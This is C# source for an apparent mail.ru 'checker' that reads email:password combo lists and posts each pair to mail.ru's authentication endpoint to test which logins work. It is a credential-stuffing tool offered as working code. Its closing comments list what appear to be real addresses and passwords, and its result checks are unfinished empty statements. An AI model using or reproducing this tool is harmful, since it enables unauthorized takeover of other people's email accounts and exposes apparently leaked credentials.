using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using xNet;
namespace ChekerMail
{
    class Accounts
    {
        private string[] _mail;
        private string[] _pass;
        public Accounts(string[] acc)
        {
            AddArray(acc);
        }
        public Accounts() { }

        //Разделяй и влавствуй
        private void AddArray(string[] value) 
        {
            _mail = new string[value.Length];
            _pass = new string[value.Length];
            string[] val = new string [2];
            for (int i = 0; i < value.Length; i++)
            {
                if (value[i].Contains(';') || value[i].Contains('|'))
                {
                    val = value[i].Replace(';', ':').Replace('|', ':').Split(':');
                }
                else 
                {
                    val = value[i].Split(':');
                }
                _mail[i] = val[0];
                _pass[i] = val[1];
            }
            val = null;
        }
        public String AddLabelProcess() => _mail.Length.ToString();
        //public String GoodAcc() {return  }


        public void Start()
        {
            using (var request = new HttpRequest())
            {
                for (int i = 0; i < _mail.Length; i++)
                {
                    request.Cookies = new CookieDictionary();
                    request.KeepAlive = true;
                    request.AddHeader("Referer", "https://account.mail.ru/");
                    request.AddHeader("Origin", "https://account.mail.ru");
                    var urlParams = new RequestParams();
                    urlParams["Login"] = _mail[i];
                    urlParams["Password"] = _pass[i];
                    urlParams["page"] = "https://my.mail.ru/?app_id_mytracker=undefined&authid=l48ahmds.bp&dwhsplit=s10273.b1ss12743a1s&from=login&mt_click_id=mt-v6h9q7-1654855918-1811863716&mt_sub1=mail.ru&mt_sub5=1&utm_campaign=my.mail.ru&utm_medium=new_portal_navigation&utm_source=portal";
                    request.UserAgent = Http.FirefoxUserAgent();
                    string responce = request.Post("https://auth.mail.ru/cgi-bin/auth", urlParams, true).ToString();
                    if (responce != null)
                    {
                        if (responce.Contains("window-loading")) ;
                        if (!responce.Contains("window-loading")) ;
                    }
                }
                //blf_blf_blf3@mail.ru
                //zefn1hbnvfy34
                //nana110-97@mail.ru
                //karina5-
            }
        }
    }
}
